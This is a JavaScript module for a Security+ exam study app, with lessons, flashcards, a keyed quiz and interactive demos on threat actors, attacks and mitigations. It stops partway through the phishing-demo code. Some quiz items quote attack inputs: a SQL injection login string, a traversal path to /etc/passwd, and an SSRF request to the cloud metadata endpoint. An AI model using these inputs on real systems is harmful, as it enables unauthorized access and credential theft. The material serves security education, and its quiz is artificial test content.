/* ================= Module 2: Threats, Vulnerabilities, and Mitigations (SY0-701 Domain 2.0, 22%) ================= */
(function(){
const LESSONS=[
{id:"actors",num:"2.1",title:"Threat actors and motivations",html:`
<p>Who is attacking, and why, tells you what they'll go after and how hard they'll try.</p>
<ul><li><b>Nation-state</b>: government-backed, very well funded, highly sophisticated. They run <b>advanced persistent threats (APTs)</b> that stay hidden for months. Motivation: espionage, disruption, war.</li>
<li><b>Organized crime</b>: professional criminals with money and skill. Motivation: <b>financial gain</b> (ransomware, fraud).</li>
<li><b>Hacktivist</b>: attacks to push a political or social cause. Motivation: <b>philosophical or political beliefs</b>. Often defacement and DDoS.</li>
<li><b>Insider threat</b>: an employee or contractor with legitimate access. Motivation: revenge, money, or simple carelessness.</li>
<li><b>Unskilled attacker</b> (script kiddie): runs tools other people wrote. Low sophistication, often seeking thrills or bragging rights.</li>
<li><b>Shadow IT</b>: staff using unapproved apps and services. Not malicious, but it creates unmanaged risk.</li></ul>
<h3>Attributes</h3>
<p>Compare actors by <b>internal vs external</b>, <b>resources and funding</b>, and <b>level of sophistication</b>. Other motivations on the exam: <b>data exfiltration</b>, <b>service disruption</b>, <b>blackmail</b>, <b>ethical</b> (bug bounty hunters), <b>revenge</b> and <b>espionage</b>.</p>
<div class="viz" id="viz-actors"></div>`},
{id:"vectors",num:"2.2",title:"Threat vectors and attack surfaces",html:`
<p>A <b>threat vector</b> is the path an attacker uses to get in. The <b>attack surface</b> is the sum of all those possible paths. Shrink the surface and you shrink the risk.</p>
<ul><li><b>Message-based</b>: email, SMS, instant messaging. The most common vector.</li>
<li><b>Image-based</b> and <b>file-based</b>: malicious code hidden in images, documents or PDFs.</li>
<li><b>Voice call</b>: vishing.</li>
<li><b>Removable devices</b>: infected USB drives dropped in a parking lot.</li>
<li><b>Vulnerable software</b>: both <b>client-based</b> (an agent you install) and <b>agentless</b> (web apps).</li>
<li><b>Unsupported systems and applications</b>: no more patches, so every new flaw stays open.</li>
<li><b>Unsecure networks</b>: open Wi-Fi, exposed wired ports, Bluetooth.</li>
<li><b>Open service ports</b> and <b>default credentials</b>.</li>
<li><b>Supply chain</b>: a compromised vendor, managed service provider (MSP) or software supplier.</li></ul>
<div class="viz" id="viz-surface"></div>`},
{id:"social",num:"2.3",title:"Social engineering",html:`
<p>Social engineering attacks the person instead of the system. It works through <b>urgency</b>, <b>authority</b>, <b>fear</b>, <b>trust</b> and <b>curiosity</b>.</p>
<ul><li><b>Phishing</b>: fraudulent email. <b>Spear phishing</b> targets a specific person. <b>Whaling</b> targets executives.</li>
<li><b>Vishing</b>: voice phishing over the phone. <b>Smishing</b>: phishing over SMS.</li>
<li><b>Misinformation / disinformation</b>: false information spread on purpose (disinformation) or by accident (misinformation).</li>
<li><b>Impersonation</b>: pretending to be IT, a vendor or an executive. <b>Pretexting</b> is the made-up story that makes it believable.</li>
<li><b>Business email compromise (BEC)</b>: using a real or spoofed executive or vendor mailbox to trick staff into wiring money.</li>
<li><b>Brand impersonation</b>: fake sites and emails dressed as a trusted brand.</li>
<li><b>Typosquatting</b>: registering look-alike domains such as examp1e.com.</li>
<li><b>Watering hole</b>: compromising a website the target group already visits.</li></ul>
<div class="viz" id="viz-phish"></div>
<div class="viz" id="viz-sesort"></div>`},
{id:"appvuln",num:"2.4",title:"Application vulnerabilities and attacks",html:`
<ul><li><b>Injection</b>: untrusted input is treated as code. <b>SQL injection (SQLi)</b> changes a database query. Defense: <b>parameterized queries</b> and input validation.</li>
<li><b>Cross-site scripting (XSS)</b>: the attacker injects script into a page that runs in other users' browsers. Defense: output encoding and input validation.</li>
<li><b>Cross-site request forgery (CSRF)</b>: tricks a logged-in user's browser into sending a request they didn't intend. Defense: anti-CSRF tokens.</li>
<li><b>Buffer overflow</b>: writing more data than a buffer holds, overwriting nearby memory such as the return address. Defense: bounds checking, memory-safe languages, ASLR and DEP.</li>
<li><b>Memory injection</b>: placing malicious code in another process's memory.</li>
<li><b>Race condition</b>: the result depends on timing. <b>Time-of-check to time-of-use (TOCTOU)</b> changes a resource between checking it and using it.</li>
<li><b>Malicious update</b>: a poisoned software update, often through the supply chain.</li>
<li><b>Directory traversal</b>: using <span class="mono">../</span> to reach files outside the web root.</li>
<li><b>Privilege escalation</b>: gaining higher rights than granted, vertical (user to admin) or horizontal (one user to another).</li>
<li><b>Replay attack</b>: capturing valid data, such as a session token, and sending it again.</li>
<li><b>Forgery</b> and <b>request forgery</b>: including server-side request forgery (SSRF), where the server is tricked into making requests for the attacker.</li></ul>
<div class="viz" id="viz-sqli"></div>
<div class="viz" id="viz-bof"></div>`},
{id:"vulns",num:"2.5",title:"System, cloud, supply chain and mobile vulnerabilities",html:`
<ul><li><b>Operating system</b>: unpatched flaws, weak defaults and misconfigurations.</li>
<li><b>Web-based</b>: SQLi and XSS against web apps.</li>
<li><b>Hardware</b>: <b>firmware</b> flaws, <b>end-of-life</b> devices that no longer get updates, and <b>legacy</b> systems that can't run modern security.</li>
<li><b>Virtualization</b>: <b>VM escape</b> (breaking out of a VM to the hypervisor) and <b>resource reuse</b> (leftover data in reallocated memory or disk).</li>
<li><b>Cloud-specific</b>: misconfigured storage buckets, exposed APIs and weak identity settings.</li>
<li><b>Supply chain</b>: a compromised <b>service provider</b>, <b>hardware provider</b> or <b>software provider</b>.</li>
<li><b>Cryptographic</b>: weak algorithms, poor key management, expired certificates.</li>
<li><b>Misconfiguration</b>: open ports, default passwords, overly broad permissions. Very common.</li>
<li><b>Mobile device</b>: <b>side loading</b> (installing apps outside the official store) and <b>jailbreaking</b> or rooting, which removes built-in protections.</li>
<li><b>Zero-day</b>: a flaw the vendor doesn't know about or hasn't patched yet. No signature exists.</li></ul>
<div class="viz" id="viz-vulns"></div>`},
{id:"malware",num:"2.6",title:"Malware",html:`
<ul><li><b>Ransomware</b>: encrypts data and demands payment. Often also steals data first (double extortion).</li>
<li><b>Trojan</b>: pretends to be legitimate software. A <b>remote access Trojan (RAT)</b> gives the attacker control.</li>
<li><b>Worm</b>: spreads across the network on its own, without user action.</li>
<li><b>Virus</b>: attaches to files and needs a user to run it.</li>
<li><b>Spyware</b>: watches and reports activity. <b>Keylogger</b>: records keystrokes.</li>
<li><b>Bloatware</b>: unwanted preinstalled software that adds attack surface.</li>
<li><b>Logic bomb</b>: code that waits for a trigger, such as a date or an employee being removed from payroll.</li>
<li><b>Rootkit</b>: hides deep in the OS or firmware with system-level access, concealing itself and other malware.</li>
<li><b>Fileless malware</b>: lives only in memory or uses built-in tools such as PowerShell, leaving little on disk.</li></ul>
<div class="viz" id="viz-malware"></div>
<div class="viz" id="viz-malid"></div>`},
{id:"attacks",num:"2.7",title:"Network, password and cryptographic attacks",html:`
<h3>Network attacks</h3>
<ul><li><b>DDoS</b>: flooding a target from many sources. <b>Amplified</b> and <b>reflected</b> attacks send small spoofed requests to servers (such as DNS) that send large replies to the victim.</li>
<li><b>DNS attacks</b>: cache poisoning and domain hijacking.</li>
<li><b>Wireless</b>: evil twins, rogue APs, deauthentication.</li>
<li><b>On-path</b> (man-in-the-middle): intercepting traffic between two parties.</li>
<li><b>Credential replay</b>: reusing captured credentials or hashes (pass-the-hash).</li>
<li><b>Malicious code</b> delivered over the network.</li></ul>
<h3>Password attacks</h3>
<ul><li><b>Brute force</b>: try every combination. Defeated by long passwords and lockouts.</li>
<li><b>Dictionary</b>: try common words and leaked passwords.</li>
<li><b>Password spraying</b>: try a few common passwords against many accounts, staying under lockout thresholds.</li>
<li><b>Credential stuffing</b>: reuse username/password pairs leaked from other breaches.</li></ul>
<div class="viz" id="viz-pwlab"></div>
<h3>Cryptographic attacks</h3>
<ul><li><b>Downgrade</b>: forcing a connection to use an older, weaker protocol (such as SSL 3.0).</li>
<li><b>Collision</b>: finding two inputs with the same hash.</li>
<li><b>Birthday attack</b>: uses probability math to find collisions faster than expected.</li></ul>
<h3>Physical attacks</h3>
<p><b>Brute force</b> (forcing a door), <b>RFID cloning</b> (copying a badge) and <b>environmental</b> attacks (cutting power or HVAC).</p>`},
{id:"ioc",num:"2.8",title:"Indicators of compromise",html:`
<p>An <b>indicator of compromise (IoC)</b> is evidence that something has gone wrong. On the exam, look for these:</p>
<ul><li><b>Account lockout</b>: someone is guessing passwords.</li>
<li><b>Concurrent session usage</b>: one account logged in from two places at once.</li>
<li><b>Impossible travel</b>: logins from New York and Singapore ten minutes apart.</li>
<li><b>Blocked content</b>: security tools blocking things they normally don't see.</li>
<li><b>Resource consumption</b>: sudden CPU, disk or bandwidth spikes (crypto miners, exfiltration).</li>
<li><b>Resource inaccessibility</b>: files that suddenly can't be opened (ransomware).</li>
<li><b>Out-of-cycle logging</b>: activity at times nothing should run.</li>
<li><b>Missing logs</b>: an attacker covering their tracks.</li>
<li><b>Published or documented</b>: your data turning up on a leak site.</li></ul>
<div class="viz" id="viz-iocq"></div>`},
{id:"mitigate",num:"2.9",title:"Mitigation techniques",html:`
<ul><li><b>Segmentation</b>: split the network so a compromise can't spread.</li>
<li><b>Access control</b>: <b>access control lists</b> and <b>permissions</b> following <b>least privilege</b>.</li>
<li><b>Application allow list</b>: only approved programs can run.</li>
<li><b>Isolation</b>: quarantine a compromised host or run risky apps in a sandbox.</li>
<li><b>Patching</b>: close known vulnerabilities quickly.</li>
<li><b>Encryption</b>: protect data even if it's stolen.</li>
<li><b>Monitoring</b>: catch what gets through.</li>
<li><b>Configuration enforcement</b>: push a secure baseline and fix drift automatically.</li>
<li><b>Decommissioning</b>: retire and wipe systems you no longer need.</li>
<li><b>Hardening</b>: install <b>endpoint protection</b> and a <b>host-based firewall</b>, use <b>HIPS</b>, <b>disable unused ports and protocols</b>, <b>change default passwords</b> and <b>remove unnecessary software</b>.</li></ul>
<div class="viz" id="viz-outbreak"></div>`}
];

const G={
 actors:[["Nation-state","Government-backed, highly funded and sophisticated; espionage"],["APT","Advanced persistent threat: stays hidden in a network for a long time"],["Organized crime","Professional criminals motivated by money"],["Hacktivist","Attacks for political or social causes"],["Insider threat","Employee or contractor misusing legitimate access"],["Unskilled attacker","Uses others' tools; low sophistication"],["Shadow IT","Unapproved apps or services used by staff"],["Threat vector","The path an attacker uses to get in"],["Attack surface","All the points where an attacker could get in"],["Supply chain attack","Compromise a vendor, MSP or supplier to reach the target"],["Agentless vector","Attack through software that needs no installed client, e.g. a web app"],["Default credentials","Factory usernames and passwords left unchanged"],["Unsupported system","No longer patched by the vendor"]],
 social:[["Phishing","Fraudulent email to steal credentials or deliver malware"],["Spear phishing","Phishing aimed at a specific person"],["Whaling","Phishing aimed at executives"],["Vishing","Voice phishing by phone"],["Smishing","Phishing by SMS text message"],["Pretexting","A made-up scenario to gain trust"],["Business email compromise","Using a real or spoofed executive or vendor mailbox to request payments"],["Typosquatting","Look-alike domain names"],["Watering hole","Infecting a site the target group already visits"],["Brand impersonation","Fake sites or emails posing as a trusted brand"],["Disinformation","False information spread deliberately"],["Misinformation","False information spread without intent to deceive"]],
 app:[["SQL injection","Malicious SQL in input alters a database query"],["SQLi defense","Parameterized queries and input validation"],["XSS","Injected script runs in other users' browsers"],["CSRF","Tricks a logged-in browser into making an unwanted request"],["SSRF","Tricks the server into making requests for the attacker"],["Buffer overflow","Writing past a buffer to overwrite memory"],["Buffer overflow defenses","Bounds checking, ASLR, DEP, memory-safe languages"],["Race condition","Outcome depends on timing of events"],["TOCTOU","Time-of-check to time-of-use: resource changes between check and use"],["Directory traversal","Using ../ to reach files outside the web root"],["Privilege escalation","Gaining higher rights than granted"],["Replay attack","Resending captured valid data such as a token"],["Memory injection","Placing malicious code in another process's memory"],["VM escape","Breaking out of a VM to the hypervisor or other VMs"],["Resource reuse","Leftover data in reallocated memory or storage"],["Side loading","Installing apps outside the official store"],["Jailbreaking","Removing OS restrictions on a mobile device"],["Zero-day","Vulnerability with no patch available yet"],["Misconfiguration","Insecure settings: open ports, default passwords, broad permissions"],["End-of-life hardware","No longer receives firmware updates"]],
 malware:[["Ransomware","Encrypts data and demands payment"],["Trojan","Malware disguised as legitimate software"],["RAT","Remote access Trojan: gives an attacker remote control"],["Worm","Self-spreading malware; no user action needed"],["Virus","Attaches to files; needs a user to run it"],["Spyware","Monitors and reports user activity"],["Keylogger","Records keystrokes"],["Bloatware","Unwanted preinstalled software"],["Logic bomb","Malicious code that runs when a condition is met"],["Rootkit","Hides with system-level access in the OS or firmware"],["Fileless malware","Runs in memory or via built-in tools; little on disk"],["Amplified DDoS","Small spoofed requests trigger large replies to the victim"],["On-path attack","Attacker intercepts traffic between two parties"],["Credential replay","Reusing captured credentials or hashes"],["Brute force","Trying every possible combination"],["Dictionary attack","Trying common words and leaked passwords"],["Password spraying","A few common passwords against many accounts"],["Credential stuffing","Reusing leaked username/password pairs on other sites"],["Downgrade attack","Forcing a weaker protocol or cipher"],["Birthday attack","Probability-based method to find hash collisions"],["RFID cloning","Copying an access badge's signal"]],
 ioc:[["Account lockout (IoC)","Repeated failed logins against an account"],["Concurrent session usage","Same account active from two places at once"],["Impossible travel","Logins from distant locations too close in time"],["Resource consumption (IoC)","Unexplained CPU, disk or bandwidth spikes"],["Resource inaccessibility","Files or systems suddenly unusable, e.g. ransomware"],["Out-of-cycle logging","Activity at unusual times"],["Missing logs","Gaps suggesting an attacker covered tracks"],["Segmentation","Splitting the network to contain compromise"],["Application allow list","Only approved programs can run"],["Isolation","Quarantining a host or sandboxing an app"],["Configuration enforcement","Pushing a secure baseline and correcting drift"],["Decommissioning","Retiring and wiping unneeded systems"],["HIPS","Host-based intrusion prevention system"],["Least privilege","Only the access needed for the job"]]
};
const DECKS=[["actors","Actors and vectors"],["social","Social engineering"],["app","Vulnerabilities"],["malware","Malware and attacks"],["ioc","IoCs and mitigation"]];
const CARDS=[];DECKS.forEach(([k])=>G[k].forEach((c,i)=>CARDS.push({deck:k,id:k+i,q:c[0],a:c[1]})));

const QUIZ=[
 {q:"A threat actor has spent 14 months quietly collecting data from a defense contractor's network using custom malware. Which actor is MOST likely?",o:["Unskilled attacker","Hacktivist","Nation-state","Shadow IT"],a:2,e:"Long-term, stealthy, custom tooling against defense targets points to a nation-state APT."},
 {q:"Which threat actor is MOST often motivated by financial gain?",o:["Hacktivist","Organized crime","Nation-state","Shadow IT"],a:1,e:"Organized crime runs ransomware and fraud for money."},
 {q:"A group defaces a company's website with a political message after the company announces a controversial policy. Which actor is this?",o:["Insider","Hacktivist","Organized crime","Nation-state"],a:1,e:"Hacktivists attack to promote a cause."},
 {q:"A marketing team stores customer lists in a personal file-sharing account the IT department doesn't know about. What is this?",o:["Insider threat","Shadow IT","Watering hole","Supply chain attack"],a:1,e:"Unapproved IT used by staff is shadow IT."},
 {q:"A disgruntled system administrator deletes backups on their last day. What type of threat is this?",o:["Insider threat","Unskilled attacker","Hacktivist","APT"],a:0,e:"They used legitimate access maliciously: an insider threat."},
 {q:"Which actor has the LOWEST sophistication?",o:["Nation-state","Organized crime","Unskilled attacker","APT"],a:2,e:"Unskilled attackers run tools others wrote."},
 {q:"Attackers compromised a managed service provider and used its remote management tool to deploy ransomware to the MSP's clients. What vector is this?",o:["Watering hole","Supply chain","Removable device","Smishing"],a:1,e:"Reaching targets through a trusted provider is a supply chain attack."},
 {q:"USB drives labeled \"Salary Review\" are found in the parking lot. What threat vector is being used?",o:["Removable device","Voice call","Agentless","Open service port"],a:0,e:"Dropped USB drives rely on curiosity to deliver malware."},
 {q:"Which action MOST directly reduces an organization's attack surface?",o:["Disabling unused services and ports","Buying cyber insurance","Adding more log storage","Hiring a hacktivist"],a:0,e:"Each closed service is one less way in."},
 {q:"A CFO receives an email that appears to be from the CEO asking for an urgent wire transfer to a new vendor. What is this MOST likely?",o:["Watering hole","Business email compromise","Typosquatting","Vishing"],a:1,e:"BEC impersonates executives or vendors to redirect payments."},
 {q:"An attacker registers micros0ft-support.com to host a fake login page. What technique is this?",o:["Typosquatting","Pretexting","Whaling","Smishing"],a:0,e:"Look-alike domains are typosquatting."},
 {q:"Users receive a text message saying their package is held and they must pay a fee at a link. What is this?",o:["Vishing","Smishing","Whaling","Watering hole"],a:1,e:"SMS phishing is smishing."},
 {q:"A caller claiming to be from the help desk asks a user to read back their MFA code to \"fix their account\". What is this?",o:["Vishing","Smishing","Typosquatting","Spear phishing"],a:0,e:"Phone-based social engineering is vishing."},
 {q:"Attackers compromise an industry forum that engineers at a target company visit daily. What is this attack?",o:["Watering hole","Whaling","BEC","Brand impersonation"],a:0,e:"They poison a site the target already visits."},
 {q:"An attacker calls reception claiming to be a fire inspector who needs access to the server room. The fake inspection story is called what?",o:["Pretexting","Tailgating","Typosquatting","Spraying"],a:0,e:"Pretexting is the invented scenario used to gain trust."},
 {q:"A phishing email targets only the CEO and CFO. What is it called?",o:["Smishing","Whaling","Vishing","Spraying"],a:1,e:"Phishing aimed at executives is whaling."},
 {q:"A login form accepts <span class='mono'>' OR 1=1 --</span> as a username and logs the attacker in. What vulnerability is this?",o:["XSS","SQL injection","CSRF","Buffer overflow"],a:1,e:"The input changed the SQL query's logic."},
 {q:"What is the BEST defense against SQL injection?",o:["Parameterized queries","Longer passwords","Disabling JavaScript","OCSP stapling"],a:0,e:"Parameterized (prepared) statements keep input as data, never code."},
 {q:"A comment on a forum contains a script that steals the session cookie of everyone who views it. What is this?",o:["Stored XSS","SQL injection","Directory traversal","Replay"],a:0,e:"Script saved on the site and run in other users' browsers is stored XSS."},
 {q:"A logged-in banking user visits a malicious page that silently submits a transfer request to the bank. What is this?",o:["CSRF","SSRF","XSS","Race condition"],a:0,e:"CSRF abuses the user's existing session."},
 {q:"A web app is tricked into fetching http://169.254.169.254/ and returning cloud credentials. What is this?",o:["CSRF","SSRF","Directory traversal","Typosquatting"],a:1,e:"The server made a request on the attacker's behalf: server-side request forgery."},
 {q:"A web request includes <span class='mono'>../../../../etc/passwd</span>. What attack is this?",o:["Directory traversal","SQL injection","Buffer overflow","Replay"],a:0,e:"The ../ sequences climb out of the web root."},
 {q:"An attacker sends 5,000 characters into a 256-byte input field and overwrites the return address. What is this?",o:["Buffer overflow","Race condition","XSS","Memory leak"],a:0,e:"Writing past a buffer's end is a buffer overflow."},
 {q:"Which OS feature makes buffer overflow exploits harder by randomizing memory locations?",o:["ASLR","DEP","TPM","HSM"],a:0,e:"Address space layout randomization moves code and data around."},
 {q:"A program checks that a file is safe, then opens it a moment later. In between, an attacker swaps the file. What is this?",o:["TOCTOU race condition","Replay","Directory traversal","Logic bomb"],a:0,e:"Time-of-check to time-of-use: the resource changed between the check and the use."},
 {q:"An attacker captures an authentication token and sends it again later to log in. What is this?",o:["Replay attack","Brute force","Birthday attack","Downgrade"],a:0,e:"Resending captured valid data is a replay. Timestamps and nonces defend against it."},
 {q:"A regular user exploits a flaw to gain administrator rights. What is this?",o:["Vertical privilege escalation","Horizontal privilege escalation","Lateral movement","Spraying"],a:0,e:"Moving up to higher rights is vertical escalation."},
 {q:"An attacker breaks out of a guest VM and gains access to the hypervisor. What is this?",o:["VM escape","Resource reuse","Side loading","Jailbreaking"],a:0,e:"VM escape is breaking the isolation between VM and host."},
 {q:"An attack uses a vulnerability that has no vendor patch and no antivirus signature. What is it?",o:["Zero-day","Legacy","Misconfiguration","Logic bomb"],a:0,e:"A zero-day is unknown to or unpatched by the vendor."},
 {q:"An employee installs an app on their phone from a website instead of the official store. What is this?",o:["Jailbreaking","Side loading","Rooting","Bluejacking"],a:1,e:"Installing outside the official store is side loading."},
 {q:"A public cloud storage bucket was left readable by anyone and leaked customer data. What vulnerability type is this?",o:["Zero-day","Misconfiguration","Buffer overflow","Supply chain"],a:1,e:"An insecure setting is a misconfiguration, one of the most common cloud problems."},
 {q:"A company runs a 15-year-old SCADA controller that the vendor no longer supports. What vulnerability does this represent?",o:["Legacy / end-of-life","Zero-day","XSS","Side loading"],a:0,e:"End-of-life systems get no patches."},
 {q:"Malware spreads from host to host across a network with no user interaction. What is it?",o:["Virus","Worm","Trojan","Logic bomb"],a:1,e:"Worms self-propagate."},
 {q:"A free PDF converter installs a hidden backdoor that gives an attacker remote control. What is it?",o:["Worm","RAT","Rootkit","Bloatware"],a:1,e:"A Trojan that provides remote access is a RAT."},
 {q:"Code in the payroll system deletes records if a certain programmer's name is removed from the employee table. What is it?",o:["Logic bomb","Worm","Spyware","Keylogger"],a:0,e:"A logic bomb waits for a trigger condition."},
 {q:"Malware hides itself from the OS and antivirus by running with kernel-level privileges. What is it?",o:["Rootkit","Adware","Bloatware","Virus"],a:0,e:"Rootkits operate deep in the system to hide."},
 {q:"An attack runs only in memory using PowerShell and leaves no executable on disk. What is it?",o:["Fileless malware","Logic bomb","Ransomware","Bloatware"],a:0,e:"Fileless malware abuses built-in tools and memory."},
 {q:"Files on a share suddenly have a .locked extension and a ransom note appears. What is it?",o:["Spyware","Ransomware","Keylogger","Rootkit"],a:1,e:"Encrypting data for payment is ransomware."},
 {q:"An attacker tries \"Spring2026!\" against 4,000 accounts, then waits an hour and tries \"Welcome1\". What attack is this?",o:["Brute force","Password spraying","Credential stuffing","Rainbow table"],a:1,e:"A few passwords against many accounts avoids lockouts: spraying."},
 {q:"An attacker uses a list of email/password pairs from another site's breach to log in to your VPN. What is this?",o:["Credential stuffing","Spraying","Dictionary","Birthday"],a:0,e:"Reusing leaked pairs is credential stuffing. MFA and unique passwords defend against it."},
 {q:"Which BEST defends against brute-force attacks on a login page?",o:["Account lockout and MFA","Longer certificate validity","Disabling ASLR","Using MD5"],a:0,e:"Lockouts slow guessing and MFA makes a guessed password insufficient."},
 {q:"An attacker forces a client and server to negotiate an obsolete protocol with weak ciphers. What is this?",o:["Downgrade attack","Collision","Replay","Birthday"],a:0,e:"Downgrade attacks push connections to weaker settings."},
 {q:"Small spoofed DNS queries cause large responses to be sent to a victim. What is this?",o:["Amplified reflected DDoS","Smurf only","On-path","DNS tunneling"],a:0,e:"The attacker reflects and amplifies traffic through third-party servers."},
 {q:"An attacker copies an employee's proximity badge with a hidden reader. What attack is this?",o:["RFID cloning","Tailgating","Shoulder surfing","Bluesnarfing"],a:0,e:"Copying the badge's RFID signal is cloning."},
 {q:"A user's account logs in from Chicago and, 12 minutes later, from Moscow. What IoC is this?",o:["Impossible travel","Resource consumption","Out-of-cycle logging","Blocked content"],a:0,e:"No one can travel that fast."},
 {q:"A file server's CPU sits at 100% overnight and outbound traffic is high to an unknown IP. Which IoC is MOST evident?",o:["Resource consumption","Account lockout","Missing logs","Concurrent sessions"],a:0,e:"Unexplained resource spikes can mean crypto mining or exfiltration."},
 {q:"The security log on a domain controller has a 3-hour gap during which the service was running. What IoC is this?",o:["Missing logs","Impossible travel","Blocked content","Account lockout"],a:0,e:"Attackers often clear logs to hide their activity."},
 {q:"Which mitigation would MOST limit the spread of a worm?",o:["Network segmentation","Longer passwords","Data masking","Bigger log files"],a:0,e:"Segmentation stops lateral movement between zones."},
 {q:"Only signed, approved programs are allowed to run on kiosks. What mitigation is this?",o:["Application allow list","Deny list","Sandboxing","Tokenization"],a:0,e:"An allow list blocks everything not approved."},
 {q:"An infected laptop is disconnected from the network but left powered on for forensics. What mitigation is this?",o:["Isolation","Decommissioning","Patching","Encryption"],a:0,e:"Isolation contains the threat while preserving evidence."},
 {q:"A tool checks servers daily and automatically resets any setting that drifts from the secure baseline. What is this?",o:["Configuration enforcement","Gap analysis","Decommissioning","Monitoring only"],a:0,e:"Configuration enforcement keeps systems at the baseline."},
 {q:"Which hardening step removes the most common easy win for attackers on new devices?",o:["Change default passwords","Enable Telnet","Install bloatware","Disable logging"],a:0,e:"Default credentials are published online."},
 {q:"Old servers that are no longer used are still connected to the network. What should be done?",o:["Decommission them securely","Leave them in case they're needed","Give them public IPs","Disable their logs"],a:0,e:"Unused systems are unpatched attack surface. Retire and wipe them."},
 {q:"Which host-based control blocks suspicious behavior, such as a process injecting into another process?",o:["HIPS","NIDS","CRL","SAN"],a:0,e:"A host-based intrusion prevention system watches and blocks behavior on the endpoint."},
 {q:"An image file posted on a forum contains code that exploits a flaw in an image-viewing library. Which threat vector is this?",o:["Image-based","Voice call","Removable device","Default credentials"],a:0,e:"Malicious code hidden in an image file is an image-based vector."},
 {q:"Which motivation BEST describes a researcher who finds a flaw and reports it through a bug bounty?",o:["Ethical","Financial gain via ransom","Espionage","Revenge"],a:0,e:"Reporting responsibly is ethical motivation."}
];

registerModule({
  id:"thr",slug:"threats",title:"Threats, Vulnerabilities, and Mitigations",
  lessons:LESSONS.map(l=>({...l,short:l.title.split(/[:,]| and /)[0]})),
  decks:DECKS,cards:CARDS,quiz:QUIZ,
  vizKeys:["actors","surface","phish","sesort","sqli","bof","vulns","malware","malid","pwlab","iocq","outbreak"],
  viz(){
/* ---- threat actor comparator ---- */
(function(){
  const el=$("#viz-actors");
  const A=[["Nation-state","External",5,5,"Espionage, disruption, war","Months-long APT campaigns with custom zero-days."],["Organized crime","External",4,4,"Financial gain","Ransomware-as-a-service, BEC fraud, data theft for sale."],["Hacktivist","External",2,3,"Political or philosophical beliefs","Website defacement, DDoS, leaking documents."],["Insider threat","Internal",2,2,"Revenge, money, or carelessness","Already has access. Often the hardest to detect."],["Unskilled attacker","External",1,1,"Thrills, bragging rights","Runs downloaded exploit kits against anything exposed."],["Shadow IT","Internal",1,1,"Convenience, not malice","Unapproved SaaS apps holding company data."]];
  const seen=new Set();const bar=(n,c)=>`<span class="meter" style="display:inline-block;width:110px;vertical-align:middle;margin:0"><i style="width:${n*20}%;background:${c}"></i></span>`;
  el.innerHTML=`<div class="viz-title">Compare threat actors</div><div class="chips">${A.map((a,i)=>`<button class="chip" data-i="${i}">${a[0]}</button>`).join("")}</div><div class="kv" id="act-kv"></div><div class="caption" aria-live="polite">Tap each actor.</div>`;
  el.addEventListener("click",e=>{const b=e.target.closest("[data-i]");if(!b)return;const a=A[+b.dataset.i];seen.add(+b.dataset.i);el.querySelectorAll("[data-i]").forEach(x=>x.setAttribute("aria-pressed",x===b));
    $("#act-kv",el).innerHTML=`<span>Location</span><b>${a[1]}</b><span>Resources</span><b>${bar(a[2],"var(--gold)")}</b><span>Sophistication</span><b>${bar(a[3],"var(--threat)")}</b><span>Motivation</span><b>${a[4]}</b>`;
    $(".caption",el).innerHTML=`<b>${a[0]}.</b> ${a[5]}`;if(seen.size===A.length)award("viz:actors",20,"Profiled every threat actor")});
})();

/* ---- attack surface reducer ---- */
(function(){
  const el=$("#viz-surface");
  const V=[["Open RDP (3389) to the internet","Close it; use a VPN or zero trust gateway"],["Default admin password on the printer","Change it"],["Windows Server 2012 (unsupported)","Upgrade or isolate it"],["Open guest Wi-Fi bridged to the LAN","Put guests on an isolated network"],["USB ports open on kiosks","Disable USB storage by policy"],["Unused FTP service on the web server","Disable the service"],["Vendor VPN account with no MFA","Require MFA and limit the vendor to one system"],["Staff click links in SMS","Run awareness training and phishing simulations"]];
  const off=new Set();
  el.innerHTML=`<div class="viz-title">Shrink the attack surface: close each vector</div><div class="big-num bad" id="as-n"></div><div class="s-small">EXPOSED VECTORS</div><div class="hd-list" id="as-l"></div><div class="caption" aria-live="polite">Tap a vector to apply the fix.</div>`;
  function draw(){const n=V.length-off.size;$("#as-n",el).textContent=n;$("#as-n",el).className="big-num "+(n===0?"good":n<4?"warn":"bad");
    $("#as-l",el).innerHTML=V.map((v,i)=>`<button class="hd-i ${off.has(i)?"ok":""}" data-i="${i}" style="text-align:left;color:var(--fg)"><span>${off.has(i)?"✓ "+v[1]:"⚠ "+v[0]}</span></button>`).join("");
    if(n===0){$(".caption",el).innerHTML='<span class="status-good">Attack surface minimized.</span> You can never get it to zero in real life, but every closed path is one less way in.';award("viz:surface",20,"Reduced the attack surface")}}
  el.addEventListener("click",e=>{const b=e.target.closest("[data-i]");if(!b)return;const i=+b.dataset.i;off.has(i)?off.delete(i):off.add(i);draw()});draw();
})();

/* ---- phishing inspector ---- */
(function(){
  const el=$("#viz-phish");
  const F={from:["Sender","From: \"Microsoft 365\" &lt;no-reply@micros0ft-secure.co&gt;","The display name says Microsoft, but the domain is micros0ft-secure.co, with a zero. Typosquatting."],
    subj:["Subject","URGENT: Your mailbox will be deleted in 2 hours","Urgency and fear push you to act before thinking."],
    greet:["Greeting","Dear user,","A generic greeting. Your real provider knows your name."],
    link:["Link","Verify account now","Hover first: the link goes to http://login.micros0ft-secure.co.ru/verify, not microsoft.com."],
    att:["Attachment","Mailbox_Restore.html","An HTML attachment can open a fake login page locally and slip past URL filters."],
    sig:["Signature","Microsoft Security Team · Redmond","Anyone can type a signature. It proves nothing."]};
  const found=new Set();
  el.innerHTML=`<div class="viz-title">Phishing inspector: find all 6 red flags</div>
  <div class="mail"><div class="mail-h"><button class="flag" data-f="from" style="all:unset;cursor:pointer"><span class="s-small">From</span> ${F.from[1].replace("From: ","")}</button><button class="flag" data-f="subj" style="all:unset;cursor:pointer"><span class="s-small">Subject</span> <b>${F.subj[1]}</b></button></div>
  <div class="mail-b"><p><button class="flag" data-f="greet" style="all:unset;cursor:pointer">${F.greet[1]}</button></p><p>We detected unusual sign-in activity. Your mailbox will be permanently deleted unless you verify your account.</p>
  <p><button class="flag mail-btn" data-f="link">${F.link[1]}</button></p><p><button class="flag mail-att" data-f="att">📎 ${F.att[1]} <span class="s-small">14 KB</span></button></p><p><button class="flag" data-f="sig" style="all:unset;cursor:pointer;color:#586175">${F.sig[1]}</button></p></div></div>
  <div class="caption" aria-live="polite">Tap anything suspicious. Careful with that button.</div><div class="rv-prog s-small"></div>`;
  let clicks=0;
  el.addEventListener("click",e=>{const f=e.target.closest("[data-f]");if(!f)return;const k=f.dataset.f;found.add(k);f.classList.add("hit");
    if(k==="link"){clicks++;if(clicks>=3)flag("clicked")}
